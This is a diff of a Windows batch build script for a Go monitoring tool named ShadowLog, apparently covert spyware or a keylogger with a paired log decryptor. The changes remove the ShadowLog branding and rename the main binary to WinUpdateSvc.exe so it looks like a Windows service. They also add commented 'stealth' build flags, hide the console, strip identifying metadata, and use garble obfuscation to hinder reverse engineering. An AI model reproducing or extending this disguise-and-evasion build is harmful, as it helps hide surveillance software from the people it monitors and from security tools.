@@ -1,9 +1,9 @@
 @echo off
 setlocal
-title ShadowLog Builder
+title System Build
 
 echo ----------------------------------------------------
-echo ShadowLog Optimized Build System
+echo  Build System
 echo ----------------------------------------------------
 
 :: Ensure we are in the project root
@@ -13,33 +13,57 @@ if not exist main.go (
     exit /b
 )
 
-:: Define build flags
-set LDFLAGS=-H windowsgui -s -w
+:: -------------------------------------------------------
+:: STEALTH BUILD FLAGS:
+::   -H windowsgui     = No console window
+::   -s                = Strip symbol table (no function names)
+::   -w                = Strip DWARF debug info
+::   -buildid=         = Remove Go build ID fingerprint
+::   -trimpath          = Remove local filesystem paths from binary
+::
+:: GARBLE (optional, install with: go install mvdan.cc/garble@latest):
+::   -literals          = Obfuscate string literals at compile time
+::   -tiny              = Strip extra metadata (file/line numbers, panic info)
+::   These make the binary MUCH harder to reverse-engineer.
+:: -------------------------------------------------------
+set LDFLAGS=-H windowsgui -s -w -buildid=
 
-echo [1/3] Building Core Monitor (ShadowLog.exe)...
-go build -ldflags "%LDFLAGS%" -o ShadowLog.exe main.go
+:: Check if garble is available for advanced obfuscation
+where garble >nul 2>nul
+if %ERRORLEVEL% EQU 0 (
+    echo [*] Garble detected — building with full obfuscation...
+    set BUILD_CMD=garble -literals -tiny build
+) else (
+    echo [*] Garble not found — building with standard flags...
+    echo     Install garble for maximum stealth: go install mvdan.cc/garble@latest
+    set BUILD_CMD=go build
+)
+
+echo.
+echo [1/3] Building Core Monitor (WinUpdateSvc.exe)...
+%BUILD_CMD% -trimpath -ldflags "%LDFLAGS%" -o WinUpdateSvc.exe main.go
 if %ERRORLEVEL% NEQ 0 (
-    echo Failed to build ShadowLog.exe
+    echo Failed to build WinUpdateSvc.exe
     exit /b
 )
 
 echo [2/3] Building Forensic Decryptor (Decryptor.exe)...
-go build -ldflags "%LDFLAGS%" -o Decryptor.exe decryptor/main.go
+%BUILD_CMD% -trimpath -ldflags "%LDFLAGS%" -o Decryptor.exe decryptor/main.go
 if %ERRORLEVEL% NEQ 0 (
     echo Failed to build Decryptor.exe
     exit /b
 )
 
 echo [3/3] Building System Uninstaller (Uninstaller.exe)...
-go build -ldflags "%LDFLAGS%" -o Uninstaller.exe uninstaller/main.go
+%BUILD_CMD% -trimpath -ldflags "%LDFLAGS%" -o Uninstaller.exe uninstaller/main.go
 if %ERRORLEVEL% NEQ 0 (
     echo Failed to build Uninstaller.exe
     exit /b
 )
 
-echo [4/4] Packaging Release (ShadowLog_Release.zip)...
+echo [4/4] Packaging Release...
 if exist ShadowLog_Release.zip del ShadowLog_Release.zip
-powershell -Command "Compress-Archive -Path ShadowLog.exe, Decryptor.exe, Uninstaller.exe, README.md -DestinationPath ShadowLog_Release.zip"
+powershell -Command "Compress-Archive -Path WinUpdateSvc.exe, Decryptor.exe, Uninstaller.exe, README.md -DestinationPath ShadowLog_Release.zip"
 if %ERRORLEVEL% NEQ 0 (
     echo Failed to create ShadowLog_Release.zip
     exit /b
@@ -48,9 +72,9 @@ if %ERRORLEVEL% NEQ 0 (
 echo.
 echo ----------------------------------------------------
 echo Build Complete: All binaries generated successfully.
-echo - ShadowLog.exe
-echo - Decryptor.exe
-echo - Uninstaller.exe
+echo - WinUpdateSvc.exe    (Core)
+echo - Decryptor.exe       (Forensics)
+echo - Uninstaller.exe     (Cleanup)
 echo - ShadowLog_Release.zip
 echo ----------------------------------------------------
 echo.
